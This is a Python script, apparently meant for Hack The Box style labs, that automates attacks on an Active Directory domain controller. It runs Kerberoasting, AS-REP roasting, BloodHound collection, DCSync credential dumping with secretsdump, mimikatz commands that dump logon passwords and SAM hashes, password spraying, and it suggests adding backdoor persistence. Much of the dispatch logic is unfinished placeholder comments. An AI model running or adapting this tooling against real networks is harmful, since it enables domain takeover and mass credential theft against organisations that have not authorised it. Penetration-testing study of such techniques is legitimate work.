#!/usr/bin/env python3

import os
import argparse
import subprocess
import json
import pandas as pd
from concurrent.futures import ThreadPoolExecutor

# Define all available modules
ALL_MODULES = [
    "recon", "enum_powerview", "enum_ldap", "enum_rpc", "smb_enum",
    "kerberoast", "asreproast", "bloodhound", "dcsync", "mimikatz",
    "gpp_password", "admin_check", "shares_enum", "users_enum",
    "trusts_enum", "privesc_checks", "persistence", "password_spray",
    "check_defenses"
]

def run_cmd(command, outfile):
    """Run a command and save output to a file with error handling."""
    try:
        os.makedirs(os.path.dirname(outfile), exist_ok=True)
        with open(outfile, "w") as f, open(f"{outfile}.error", "w") as err_f:
            result = subprocess.run(
                command,
                shell=True,
                stdout=f,
                stderr=err_f,
                check=True,
                text=True
            )
        return result
    except subprocess.CalledProcessError as e:
        print(f"[-] Command failed: {command}\nError: {e}")
    except Exception as e:
        print(f"[-] Unexpected error: {e}")

def generate_html_report(outdir):
    """Generate an HTML report from findings."""
    findings = []
    for root, _, files in os.walk(outdir):
        for file in files:
            if file.endswith((".txt", ".log")):
                with open(os.path.join(root, file), "r") as f:
                    content = f.read()
                    findings.append({"Module": root.split("/")[-1], "File": file, "Content": content})
    
    df = pd.DataFrame(findings)
    df.to_html(f"{outdir}/report.html")
    print(f"[+] HTML report generated at {outdir}/report.html")

def recon(dc_ip, outdir):
    run_cmd(f"nmap -sV -Pn -p- {dc_ip}", f"{outdir}/nmap.txt")

def enum_powerview(outdir):
    run_cmd("echo '[+] Use PowerView.ps1 inside PowerShell session'", f"{outdir}/powerview.txt")

def enum_ldap(domain, dc_ip, outdir):
    run_cmd(f"ldapsearch -x -H ldap://{dc_ip} -b 'dc={domain.replace('.', ',dc=')}'", f"{outdir}/ldap.txt")

def enum_rpc(dc_ip, outdir):
    run_cmd(f"rpcclient -U '' {dc_ip} -N -c 'enumdomusers'", f"{outdir}/rpc.txt")

def smb_enum(dc_ip, outdir):
    run_cmd(f"smbclient -L \\\\{dc_ip}\\ -N", f"{outdir}/smbclient.txt")

def kerberoast(domain, user, password, dc_ip, outdir, hash=None, ticket=None):
    if hash:
        run_cmd(f"GetUserSPNs.py {domain}/{user} -hashes {hash} -dc-ip {dc_ip} -outputfile {outdir}/spns.hashes", f"{outdir}/kerberoast.log")
    elif ticket:
        run_cmd(f"export KRB5CCNAME={ticket} && GetUserSPNs.py -k -dc-ip {dc_ip} -outputfile {outdir}/spns.hashes", f"{outdir}/kerberoast.log")
    else:
        run_cmd(f"GetUserSPNs.py {domain}/{user}:{password} -dc-ip {dc_ip} -outputfile {outdir}/spns.hashes", f"{outdir}/kerberoast.log")

def extract_users_enum4linux(dc_ip, userlist_path):
    output = subprocess.check_output(f"enum4linux-ng {dc_ip}", shell=True).decode()
    users = set()
    for line in output.splitlines():
        if "username:" in line.lower() or "[+]" in line.lower():
            parts = line.strip().split()
            for part in parts:
                if part.lower().startswith("svc-") or part.lower().startswith("admin") or part.isalnum():
                    users.add(part.lower())
    with open(userlist_path, "w") as f:
        for user in sorted(users):
            f.write(user + "\n")
    return userlist_path

def asreproast(domain, userlist, dc_ip, outdir, auto_enum=False):
    if auto_enum:
        print("[*] No userlist provided, running enum4linux-ng to extract usernames...")
        userlist = f"{outdir}/autogen_users.txt"
        extract_users_enum4linux(dc_ip, userlist)
    os.makedirs(outdir, exist_ok=True)
    run_cmd(f"GetNPUsers.py {domain}/ -usersfile {userlist} -format hashcat -dc-ip {dc_ip}", f"{outdir}/asrep.txt")

def bloodhound(domain, user, password, dc_ip, outdir, hash=None, ticket=None):
    if hash:
        run_cmd(f"bloodhound-python -u {user} -p {password} -hashes {hash} -d {domain} -dc {dc_ip} -c all -o {outdir}", f"{outdir}/bloodhound.log")
    elif ticket:
        run_cmd(f"export KRB5CCNAME={ticket} && bloodhound-python -k -d {domain} -dc {dc_ip} -c all -o {outdir}", f"{outdir}/bloodhound.log")
    else:
        run_cmd(f"bloodhound-python -u {user} -p {password} -d {domain} -dc {dc_ip} -c all -o {outdir}", f"{outdir}/bloodhound.log")

def dcsync(domain, user, password, dc_ip, outdir, hash=None, ticket=None):
    if hash:
        run_cmd(f"secretsdump.py {domain}/{user} -hashes {hash}@{dc_ip}", f"{outdir}/dcsync.txt")
    elif ticket:
        run_cmd(f"export KRB5CCNAME={ticket} && secretsdump.py -k {domain}/{user}@{dc_ip}", f"{outdir}/dcsync.txt")
    else:
        run_cmd(f"secretsdump.py {domain}/{user}:{password}@{dc_ip}", f"{outdir}/dcsync.txt")

def mimikatz_script(outdir):
    script = """
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
exit
"""
    os.makedirs(outdir, exist_ok=True)
    with open(f"{outdir}/mimikatz.txt", "w") as f:
        f.write(script)

def gpp_password(dc_ip, outdir):
    run_cmd(f"smbclient \\\\{dc_ip}\\SYSVOL -N -c 'recurse;prompt off;ls'", f"{outdir}/gpp.txt")

def admin_check(domain, user, password, dc_ip, outdir, hash=None):
    if hash:
        run_cmd(f"crackmapexec smb {dc_ip} -u {user} -H {hash}", f"{outdir}/admin_check.txt")
    else:
        run_cmd(f"crackmapexec smb {dc_ip} -u {user} -p {password}", f"{outdir}/admin_check.txt")

def shares_enum(dc_ip, outdir):
    run_cmd(f"crackmapexec smb {dc_ip} --shares", f"{outdir}/shares.txt")

def users_enum(dc_ip, outdir):
    run_cmd(f"enum4linux-ng {dc_ip}", f"{outdir}/users.txt")

def trusts_enum(domain, user, password, dc_ip, outdir, hash=None):
    if hash:
        run_cmd(f"crackmapexec ldap {dc_ip} -u {user} -H {hash} --trusted-for-delegation", f"{outdir}/trusts.txt")
    else:
        run_cmd(f"crackmapexec ldap {dc_ip} -u {user} -p {password} --trusted-for-delegation", f"{outdir}/trusts.txt")

def privesc_checks(outdir):
    run_cmd("echo '[+] Run winPEAS.bat or SharpUp manually on the target'", f"{outdir}/privesc.txt")

def persistence(outdir):
    run_cmd("echo '[+] Consider adding scheduled tasks, new users, reg backdoors, etc.'", f"{outdir}/persistence.txt")

def password_spray(domain, userlist, password, dc_ip, outdir):
    run_cmd(f"crackmapexec smb {dc_ip} -u {userlist} -p {password} --no-bruteforce", f"{outdir}/password_spray.txt")

def check_defenses(dc_ip, outdir):
    run_cmd(f"crackmapexec smb {dc_ip} --loggedon-users", f"{outdir}/defenses/loggedon_users.txt")
    run_cmd(f"SharpHound.exe -c All --zipfilename {outdir}/bloodhound.zip", f"{outdir}/defenses/sysmon_check.txt")

def cleanup(outdir):
    if input("[!] Delete all output files? (y/n): ").lower() == "y":
        os.system(f"rm -rf {outdir}")

def run_parallel(modules, args, base):
    """Run modules in parallel using ThreadPoolExecutor."""
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = []
        for module in modules:
            if module in args.modules:
                if module == "recon":
                    futures.append(executor.submit(recon, args.dc_ip, f"{base}/recon"))
                elif module == "enum_powerview" and (args.user and (args.password or args.hash or args.ticket)):
                    futures.append(executor.submit(enum_powerview, f"{base}/powerview"))
                # ... (add other modules similarly)
        for future in futures:
            future.result()  # Wait for all threads to complete

def main():
    parser = argparse.ArgumentParser(description="Full AD Enumeration and Exploitation Script")
    parser.add_argument("--dc-ip", required=True, help="Domain Controller IP (e.g., 10.10.10.1)")
    parser.add_argument("--domain", required=True, help="Domain name (e.g., HTB.LOCAL)")
    parser.add_argument("-u", "--user", help="Username (e.g., 'svc_admin')")
    parser.add_argument("-p", "--password", help="Password (e.g., 'P@ssw0rd!')")
    parser.add_argument("--hash", help="NTLM hash (e.g., 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0')")
    parser.add_argument("--ticket", help="Kerberos ticket file (e.g., 'krb5cc_user')")
    parser.add_argument("--userlist", default="users.txt", help="User list for ASREPRoast")
    parser.add_argument("-m", "--modules", nargs='+', choices=ALL_MODULES, default=ALL_MODULES)
    parser.add_argument("-o", "--output", default="ad_output", help="Output directory")
    parser.add_argument("--cleanup", action="store_true", help="Clean up output files after execution")
    args = parser.parse_args()

    creds_provided = args.user and (args.password or args.hash or args.ticket)
    base = args.output

    # Run modules (sequential or parallel)
    if 'parallel' in args.modules:
        run_parallel(args.modules, args, base)
    else:
        if 'recon' in args.modules: recon(args.dc_ip, f"{base}/recon")
        if 'enum_powerview' in args.modules and creds_provided: enum_powerview(f"{base}/powerview")
        if 'enum_ldap' in args.modules: enum_ldap(args.domain, args.dc_ip, f"{base}/ldap")
        # ... (rest of sequential execution)

    generate_html_report(base)

    if args.cleanup:
        cleanup(base)

    print(f"[+] All selected modules completed. Output saved in {base}/")

if __name__ == "__main__":
    main()
